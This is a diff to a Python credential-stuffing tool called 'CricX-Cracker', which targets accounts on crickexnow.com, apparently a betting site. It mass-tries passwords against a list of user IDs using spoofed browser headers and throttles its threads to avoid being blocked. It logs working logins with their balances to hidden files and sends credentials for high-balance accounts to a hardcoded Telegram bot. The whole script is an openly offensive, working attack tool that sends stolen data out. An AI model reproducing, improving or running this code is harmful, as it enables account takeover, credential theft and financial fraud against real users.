@@ -1,3 +1,4 @@
+
 import os
 import json
 import time
@@ -15,6 +16,7 @@ Y = '\033[93m'
 D = '\033[0m'
 C = '\033[96m'
 
+# Global variables
 lock = threading.Lock()
 request_count = 0
 successful_logins = 0
@@ -25,7 +27,7 @@ def show_logo():
     RESET = '\033[0m'
     COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
     ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
-    subtitle = 'CricX-Cracker V-0.5 (Final Balance Fix)'
+    subtitle = 'CricX-Cracker V-0.6 (Full Fixed)'
     width = shutil.get_terminal_size(fallback=(80, 20)).columns
     lines = [ln.center(width) for ln in ASCII.splitlines()]
     for i, line in enumerate(lines):
@@ -40,6 +42,7 @@ def attempt_login(user_id, pw):
         if user_id in successful_users: return
         request_count += 1
 
+    # cxs.py logic based headers
     headers = {
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -51,7 +54,7 @@ def attempt_login(user_id, pw):
         'Origin': 'https://crickexnow.com',
     }
 
-    # cxs.py এর সেই নির্দিষ্ট ফিঙ্গারপ্রিন্ট
+    # cxs.py logic based fingerprint payload
     json_data = {
         'languageTypeId': 1,
         'currencyTypeId': 8,
@@ -76,10 +79,7 @@ def attempt_login(user_id, pw):
                 data_layer = res_json.get('data', {})
                 
                 # ব্যালেন্স ফিক্স করার জন্য সকল সম্ভাব্য কি চেক করা
-                # আপনার ৩২০০ ব্যালেন্স মিস হওয়ার কথা না এবার
-                balance = data_layer.get('mainWallet', data_layer.get('balance', data_layer.get('walletBalance', '0')))
-                
-                # ভিআইপি র‍্যাঙ্ক ফিক্স
+                balance = data_layer.get('mainWallet', data_layer.get('balance', '0'))
                 level = data_layer.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data_layer.get('userId', user_id)
 
@@ -87,7 +87,7 @@ def attempt_login(user_id, pw):
                     successful_logins += 1
                     successful_users.add(user_id)
                 
-                # র‍্যাঙ্ক অনুযায়ী ফাইল স্ট্যাটাস
+                # র‍্যাঙ্ক অনুযায়ী ফাইল এবং প্রোফাইল স্ট্যাটাস
                 if level in ['Normal', 'Bronze']:
                     filename = '.normal.txt'
                     profile_status = 'Poor'
@@ -99,13 +99,13 @@ def attempt_login(user_id, pw):
                     earn_text = '2 BDT'
                     color_print = G
 
-                # ব্যালেন্স ডাটা প্রসেসিং ও টেলিগ্রাম অ্যালার্ট
+                # ব্যালেন্স প্রসেসিং ও টেলিগ্রাম লজিক
                 try:
                     bal_float = float(balance)
                     if bal_float >= 1000:
                         send_to_telegram(uid, pw, balance, level)
                     
-                    # আর্নিং ডিসপ্লে লজিক
+                    # আর্নিং ডিসপ্লে ব্যালেন্স ছাড়া
                     if bal_float >= 10000:
                         print(f'{BOLD}{C} {uid} | Profile : {profile_status} | Earned : 100 BDT {D}')
                     elif 1500 <= bal_float <= 9999:
@@ -115,7 +115,7 @@ def attempt_login(user_id, pw):
                 except:
                     print(f'{BOLD}{color_print} {uid} | Profile : {profile_status} | Earned : {earn_text} {D}')
 
-                # রিয়েল-টাইম ব্যালেন্সসহ ফাইলে সেভ করা
+                # ফাইলে রিয়েল-টাইম ব্যালেন্সসহ সেভ হবে
                 with open(filename, 'a', encoding='utf-8') as f:
                     f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
 
@@ -129,26 +129,27 @@ def attempt_login(user_id, pw):
 def send_to_telegram(uid, pw, balance, level):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
-    msg = f'🔥 [VALID HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
+    msg = f'🔥 [CX [CXHIT 100\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
     try: requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'})
     except: pass
 
 def main():
     show_logo()
-    if not os.path.exists('.uids.txt'):
-        print(f'{R} [!] .uids.txt not found!{D}')
+    file_name = '.uids.txt'
+    if not os.path.exists(file_name):
+        print(f'{R} [!] {file_name} file not found!{D}')
         return
     
     p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
     p2 = input(f'{Y} PASSWORD 2 : {D}').strip()
     
-    with open('.uids.txt', 'r') as f:
+    with open(file_name, 'r') as f:
         users = [line.strip().split()[0] for line in f if line.strip()]
 
     print(f'{BOLD}{Y} [>] CRACKING STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
     print(f'{Y} ------------------------------------------------------\n{D}')
 
-    # ৪MD এড়াতে ২ থ্রেড রাখা হয়েছে
+    # ৪MD ব্লক এড়াতে ছোট ব্যাচে থ্রেড চালানো হচ্ছে
     with ThreadPoolExecutor(max_workers=2) as ex:
         for u in users:
             ex.submit(attempt_login, u, p1)
@@ -156,4 +157,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
